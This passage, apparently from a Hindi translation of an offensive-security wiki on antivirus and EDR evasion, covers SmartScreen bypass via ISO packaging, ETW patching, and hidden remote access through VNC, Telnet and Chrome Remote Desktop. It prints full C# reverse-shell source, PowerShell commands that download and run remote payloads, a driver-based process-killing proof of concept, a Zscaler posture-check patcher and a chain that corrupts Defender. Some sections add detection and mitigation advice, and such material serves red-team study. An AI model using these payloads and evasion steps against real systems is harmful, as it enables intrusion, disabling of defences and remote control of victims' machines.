SmartScreen मुख्य रूप से एक reputation-based approach पर काम करता है, जिसका मतलब है कि कम डाउनलोड होने वाले applications SmartScreen को trigger करेंगे, जिससे end user को फ़ाइल execute करने से पहले alert किया जाएगा और रोक दिया जाएगा (हालाँकि फ़ाइल को फिर भी More Info -> Run anyway पर क्लिक करके चलाया जा सकता है)।

**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है जिसका नाम Zone.Identifier है और यह इंटरनेट से फ़ाइलें डाउनलोड करने पर अपने आप बन जाता है, साथ ही उस URL का भी रिकॉर्ड रखता है जहाँ से फ़ाइल डाउनलोड की गई थी।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> यह ध्यान देने योग्य है कि ऐसे executables जो एक **trusted** signing certificate के साथ signed होते हैं वे **SmartScreen** को trigger नहीं करेंगे।

अपने payloads को Mark of The Web से बचाने का एक बहुत प्रभावी तरीका यह है कि उन्हें किसी container जैसे ISO में पैकेज किया जाए। इसका कारण यह है कि Mark-of-the-Web (MOTW) को **non NTFS** volumes पर लागू नहीं किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक tool है जो payloads को output containers में पैकेज करता है ताकि Mark-of-the-Web से बचाव किया जा सके।

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows में एक शक्तिशाली लॉगिंग मैकेनिज्म है जो applications और system components को **events लॉग** करने की अनुमति देता है। हालांकि, इसे security products द्वारा malicious गतिविधियों की निगरानी और पहचान के लिए भी उपयोग किया जा सकता है।

जैसे AMSI को disable (bypass) किया जाता है, वैसे ही उपयोगकर्ता-स्थान प्रक्रिया के **`EtwEventWrite`** फ़ंक्शन को तुरंत बिना किसी इवेंट को लॉग किए return करवा देना भी संभव है। यह फ़ंक्शन को मेमोरी में patch करके तुरंत return करवा कर किया जाता है, जिससे उस प्रक्रिया के लिए ETW logging प्रभावी रूप से disable हो जाता है।

अधिक जानकारी के लिए देखें **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) और [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**।


## C# Assembly Reflection

C# binaries को मेमोरी में लोड करना लंबे समय से जाना हुआ तरीका है और यह अभी भी AV द्वारा पकड़े बिना अपने post-exploitation tools चलाने का एक बहुत अच्छा तरीका है।

चूँकि payload सीधे मेमोरी में लोड होगा और डिस्क को टच नहीं करेगा, इसलिए हमें पूरे प्रोसेस के लिए केवल AMSI को patch करने की चिंता करनी होगी।

अधिकांश C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे मेमोरी में execute करने की क्षमता देते हैं, लेकिन ऐसा करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें एक नया sacrificial process spawn करना शामिल है, उस नए प्रोसेस में अपना post-exploitation malicious कोड inject करना, अपना malicious कोड execute करना और समाप्त होने पर नए प्रोसेस को kill कर देना। इसके फायदे और नुकसान दोनों हैं। Fork and run पद्धति का लाभ यह है कि execution हमारे Beacon implant प्रोसेस के **बाहर** होता है। इसका अर्थ है कि यदि हमारे post-exploitation क्रिया में कुछ गलत हो जाता है या पकड़ लिया जाता है, तो हमारी **implant के बचने** की संभावना **काफ़ी अधिक** होती है। नुकसान यह है कि Behavioural Detections द्वारा पकड़े जाने की **संभावना अधिक** होती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

यह अपने ही प्रोसेस में post-exploitation malicious कोड **inject** करने के बारे में है। इस तरह आप नया प्रोसेस बनाने और उसे AV द्वारा scan कराए जाने से बच सकते हैं, लेकिन drawback यह है कि अगर आपके payload के execution में कुछ गलत होता है तो आपकी beacon खोने की **बहुत अधिक संभावना** होती है क्योंकि यह crash कर सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> यदि आप C# Assembly loading के बारे में और पढ़ना चाहते हैं तो इस आर्टिकल को देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप C# Assemblies **from PowerShell** से भी load कर सकते हैं, देखें [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

जैसा कि [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित है, यह संभव है कि अन्य भाषाओं का उपयोग करके malicious कोड execute किया जाए यदि compromised मशीन को Attacker Controlled SMB share पर installed interpreter environment तक पहुँच दी जाए।

SMB share पर Interpreter Binaries और environment तक पहुंच देकर आप compromised मशीन की मेमोरी के भीतर इन भाषाओं में **arbitrary code execute** कर सकते हैं।

रिपो में कहा गया है: Defender अभी भी scripts को scan करता है लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **static signatures को bypass करने की अधिक लचीलापन** है। इन भाषाओं में random un-obfuscated reverse shell scripts के साथ परीक्षण सफल रहा है।

## TokenStomping

Token stomping एक तकनीक है जो एक attacker को अनुमति देती है कि वह **access token या एक security product जैसे EDR या AV** को manipulate करे, जिससे वे उसकी privileges घटा सकें ताकि प्रक्रिया मर न जाए पर उसे malicious गतिविधियों की जांच करने की permissions ना मिलें।

Windows इसे रोकने के लिए सुरक्षा प्रक्रियाओं के tokens पर external processes के handles प्राप्त करने से रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

जैसा कि [**इस ब्लॉग पोस्ट**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में बताया गया है, victims PC पर Chrome Remote Desktop deploy करना और फिर उसे takeover कर persistence बनाए रखना आसान है:
1. https://remotedesktop.google.com/ से डाउनलोड करें, "Set up via SSH" पर क्लिक करें, और फिर Windows के लिए MSI फ़ाइल पर क्लिक करके MSI फ़ाइल डाउनलोड करें।
2. victim पर installer को silently चलाएँ (admin आवश्यक): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop पेज पर वापस जाएँ और next पर क्लिक करें। विज़ार्ड आपको authorize करने के लिए कहेगा; जारी रखने के लिए Authorize बटन पर क्लिक करें।
4. दिए गए पैरामीटर को कुछ समायोजनों के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (ध्यान दें: pin पैरामीटर GUI का उपयोग किए बिना pin सेट करने की अनुमति देता है।)


## Advanced Evasion

Evasion एक बहुत ही जटिल विषय है, कभी-कभी आपको एक ही सिस्टम में कई अलग-अलग telemetry स्रोतों का ध्यान रखना पड़ता है, इसलिए परिपक्व environments में पूरी तरह अज्ञात रहना लगभग असंभव है।

हर environment जिसका आप सामना करते हैं उसकी अपनी मजबूत और कमजोरियाँ होंगी।

मैं दृढ़ता से सुझाव देता हूँ कि आप [@ATTL4S](https://twitter.com/DaniLJ94) की यह टॉक देखें, ताकि Advanced Evasion techniques में प्रवेश मिल सके।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह [@mariuszbit](https://twitter.com/mariuszbit) की Evasion in Depth पर एक और महान टॉक है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं जो बाइनरी के हिस्सों को हटाता जाएगा जब तक कि यह पता न लगा ले कि Defender किन हिस्सों को malicious मान रहा है और उसे आपको विभाजित करके दिखाएगा।\
इसी तरह की सेवा देने वाला एक और टूल [**avred**](https://github.com/dobin/avred) है जिसका ओपन वेब सर्विस [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर उपलब्ध है।

### **Telnet Server**

Windows10 तक, सभी Windows में एक **Telnet server** आता था जिसे आप (administrator के रूप में) इंस्टॉल कर सकते थे इस तरह:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
इसे सिस्टम शुरू होते ही **start** होने के लिए सेट करें और इसे अभी **run** करें:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet पोर्ट बदलें** (stealth) और firewall को अक्षम करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आप bin downloads चाहते हैं, setup नहीं)

**ON THE HOST**: Execute _**winvnc.exe**_ और सर्वर को कॉन्फ़िगर करें:

- विकल्प _Disable TrayIcon_ को सक्षम करें
- _VNC Password_ में पासवर्ड सेट करें
- _View-Only Password_ में पासवर्ड सेट करें

फिर, बाइनरी _**winvnc.exe**_ और **नई बनाई गई** फ़ाइल _**UltraVNC.ini**_ को **victim** के अंदर रखें

#### **Reverse connection**

The **attacker** को अपने **host** पर बाइनरी `vncviewer.exe -listen 5900` चलाना चाहिए ताकि यह रिवर्स **VNC connection** पकड़ने के लिए तैयार रहे। फिर, **victim** के अंदर: winvnc daemon `winvnc.exe -run` शुरू करें और चलाएँ `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** स्टेल्थ बनाए रखने के लिए आपको कुछ चीजें नहीं करनी चाहिए

- यदि `winvnc` पहले से चल रहा है तो इसे शुरू न करें वरना यह [popup](https://i.imgur.com/1SROTTl.png) ट्रिगर कर देगा। यह चल रहा है या नहीं जांचने के लिए `tasklist | findstr winvnc` चलाएँ
- वही डायरेक्टरी में `UltraVNC.ini` के बिना `winvnc` शुरू न करें वरना यह [the config window](https://i.imgur.com/rfMQWcf.png) खोल देगा
- सहायता के लिए `winvnc -h` न चलाएँ वरना यह [popup](https://i.imgur.com/oc18wcu.png) ट्रिगर कर देगा

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब **lister शुरू करें** `msfconsole -r file.rc` के साथ और **निष्पादित करें** **xml payload** के साथ:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**वर्तमान defender बहुत जल्दी प्रोसेस को समाप्त कर देगा।**

### अपना खुद का reverse shell कंपाइल करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे इस कमांड से कंपाइल करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसे निम्न के साथ उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using कम्पाइलर
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### build injectors बनाने के लिए python का उपयोग — उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य उपकरण
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### अधिक

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ने एक छोटे console utility का उपयोग किया जिसे **Antivirus Terminator** कहा जाता है, ताकि ransomware गिराने से पहले endpoint protections को disable किया जा सके। यह टूल अपना **own vulnerable but *signed* driver** लेकर आता है और इसे ऐसे miss-use करता है कि privileged kernel operations जारी किए जा सकें, जिन्हें Protected-Process-Light (PPL) AV सेवाएँ भी ब्लॉक नहीं कर सकतीं।

मुख्य बिंदु
1. **साइन किया गया ड्राइवर**: डिस्क पर जो फ़ाइल डिलीवर की जाती है वह `ServiceMouse.sys` है, लेकिन बाइनरी वास्तव में Antiy Labs के “System In-Depth Analysis Toolkit” से वैध रूप से साइन की गई ड्राइवर `AToolsKrnl64.sys` है। क्योंकि ड्राइवर पर वैध Microsoft सिग्नेचर है, यह Driver-Signature-Enforcement (DSE) सक्षम होने पर भी लोड हो जाता है।
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
पहली लाइन ड्राइवर को एक **कर्नेल सेवा** के रूप में रजिस्टर करती है और दूसरी लाइन इसे स्टार्ट करती है ताकि `\\.\ServiceMouse` user land से एक्सेसिबल हो जाए।
3. **ड्राइवर द्वारा एक्सपोज़ किए गए IOCTLs**
| IOCTL code | क्षमता                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID द्वारा किसी भी प्रक्रिया को समाप्त करना (Defender/EDR सेवाओं को बंद करने के लिए उपयोग किया गया) |
| `0x990000D0` | डिस्क पर किसी भी फ़ाइल को हटाना |
| `0x990001D0` | ड्राइवर को अनलोड करना और सेवा को हटाना |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **यह क्यों काम करता है**: BYOVD user-mode सुरक्षा को पूरी तरह से बायपास कर देता है; कर्नेल में चलने वाला कोड *protected* processes को खोल सकता है, उन्हें समाप्त कर सकता है, या कर्नेल ऑब्जेक्ट्स में छेड़छाड़ कर सकता है चाहे PPL/PP, ELAM या अन्य hardening फीचर मौजूद हों।

Detection / Mitigation
•  Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) को सक्षम करें ताकि Windows `AToolsKrnl64.sys` को लोड करने से इनकार करे।  
•  नई *कर्नेल* सेवाओं के निर्माण पर निगरानी रखें और तब अलर्ट करें जब कोई ड्राइवर world-writable डायरेक्टरी से लोड हो या allow-list में मौजूद न हो।  
•  कस्टम device objects के लिए user-mode हैंडल और उसके बाद आने वाले संदिग्ध `DeviceIoControl` कॉल्स पर नजर रखें।

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler का **Client Connector** device-posture rules को लोकल तरीके से लागू करता है और अन्य कंपोनेंट्स से परिणामों को संवाद करने के लिए Windows RPC पर निर्भर करता है। दो कमजोर डिज़ाइन विकल्प एक पूर्ण बायपास को संभव बनाते हैं:

1. Posture मूल्यांकन **पूरी तरह क्लाइंट-साइड** पर होता है (एक boolean सर्वर को भेजा जाता है)।  
2. Internal RPC endpoints केवल यह मान्य करते हैं कि कनेक्ट करने वाली executable **signed by Zscaler** है (via `WinVerifyTrust`)।

डिस्क पर चार signed बाइनरीज़ को **patch** करके दोनों मेकेनिज़्म को निष्क्रिय किया जा सकता है:

| Binary | मूल लॉजिक में पैच | परिणाम |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` लौटाता है, इसलिए हर चेक अनुपालन माना जाता है |
| `ZSAService.exe` | WinVerifyTrust को indirec t कॉल | NOP-ed ⇒ कोई भी (यहाँ तक कि unsigned) प्रक्रिया RPC पाइप्स से बाइंड कर सकती है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से बदला गया |
| `ZSATunnel.exe` | टनल पर integrity checks | बायपास कर दिया गया |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **All** posture checks display **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.

This case study demonstrates how purely client-side trust decisions and simple signature checks can be defeated with a few byte patches.

## Protected Process Light (PPL) का दुरुपयोग करके AV/EDR को LOLBINs के साथ छेड़छाड़ करना

Protected Process Light (PPL) एक signer/level hierarchy लागू करता है ताकि केवल equal-or-higher protected processes ही एक-दूसरे के साथ tamper कर सकें। Offensive तौर पर, अगर आप legitimately launch कर सकते हैं एक PPL-enabled binary और उसके arguments नियंत्रित कर सकें, तो आप benign functionality (उदा., logging) को एक constrained, PPL-backed write primitive में बदल सकते हैं जो AV/EDR द्वारा उपयोग किए जाने वाले protected directories के खिलाफ काम करता है।

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- साइन किया गया सिस्टम बाइनरी `C:\Windows\System32\ClipUp.exe` स्वयं स्पॉन होता है और कॉलर-निर्दिष्ट पथ पर लॉग फ़ाइल लिखने के लिए एक पैरामीटर स्वीकार करता है।
- जब इसे PPL प्रक्रिया के रूप में लॉन्च किया जाता है, तो फ़ाइल लिखना PPL बैकिंग के साथ होता है।
- ClipUp स्पेस वाले paths को पार्स नहीं कर सकता; सामान्यतः सुरक्षित लोकेशनों की ओर इशारा करने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- शॉर्ट नाम सूचीबद्ध करें: `dir /x` प्रत्येक parent directory में।
- cmd में शॉर्ट पाथ निकालें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp) को `CREATE_PROTECTED_PROCESS` के साथ एक लॉन्चर (उदा., CreateProcessAsPPL) का उपयोग करके लॉन्च करें।
2) ClipUp लॉग-पाथ आर्गुमेंट पास करें ताकि एक प्रोटेक्टेड AV डायरेक्टरी (उदा., Defender Platform) में फ़ाइल क्रिएशन को मजबूर किया जा सके। आवश्यकता हो तो 8.3 short names का उपयोग करें।
3) यदि टार्गेट बाइनरी सामान्यतः AV द्वारा रन होते समय खुली/लॉक रहती है (उदा., MsMpEng.exe), तो AV के शुरू होने से पहले बूट पर लिखाई शेड्यूल करने के लिए एक auto-start service इंस्टॉल करें जो भरोसेमंद रूप से पहले चले। बूट ऑर्डरिंग को Process Monitor (boot logging) से वैलिडेट करें।
4) रीबूट पर PPL-backed लिखाई AV के अपने बाइनरी लॉक करने से पहले होती है, जिससे टार्गेट फ़ाइल करप्ट हो जाती है और स्टार्टअप बाधित हो जाता है।

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- आप placement के अलावा `ClipUp` द्वारा लिखी जाने वाली सामग्री को नियंत्रित नहीं कर सकते; यह primitive सटीक सामग्री injection की बजाय corruption के लिए उपयुक्त है।
- सेवा install/start करने और reboot विंडो के लिए local admin/SYSTEM की आवश्यकता।
- Timing महत्वपूर्ण है: लक्ष्य फ़ाइल खुला नहीं होना चाहिए; boot-time execution फ़ाइल लॉक से बचाता है।

Detections
- `ClipUp.exe` की असामान्य arguments के साथ process creation, विशेषकर non-standard launchers द्वारा parented, boot के आसपास।
- New services जो suspicious binaries को auto-start करने के लिए configure किए गए हैं और जो लगातार Defender/AV से पहले starten होते हैं। Defender startup failures से पहले service creation/modification की जांच करें।
- Defender binaries/Platform directories पर file integrity monitoring; protected-process flags वाले processes द्वारा अनपेक्षित file creations/modifications।
- ETW/EDR telemetry: उन processes की तलाश करें जो `CREATE_PROTECTED_PROCESS` के साथ बनाए गए हैं और non-AV binaries द्वारा असामान्य PPL स्तर का उपयोग करते हैं।

Mitigations
- WDAC/Code Integrity: सीमित करें कि कौन से signed binaries PPL के रूप में और किन parents के अंतर्गत रन कर सकते हैं; legitimate contexts के बाहर `ClipUp` invocation को block करें।
- Service hygiene: auto-start services के creation/modification को प्रतिबंधित करें और start-order manipulation की निगरानी करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections सक्षम हैं; binary corruption की ओर इशारा करने वाले startup errors की जांच करें।
- यदि आपके environment के अनुकूल हो तो security tooling होस्ट करने वाले वॉल्यूम पर 8.3 short-name generation को अक्षम करने पर विचार करें (व्यापक रूप से परीक्षण करें)।

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Platform Version Folder Symlink Hijack के माध्यम से Microsoft Defender में छेड़छाड़

Windows Defender उस platform को चुनता है जहाँ से यह चल रहा है, निम्न फोल्डरों के अंतर्गत subfolders को enumerate करके:
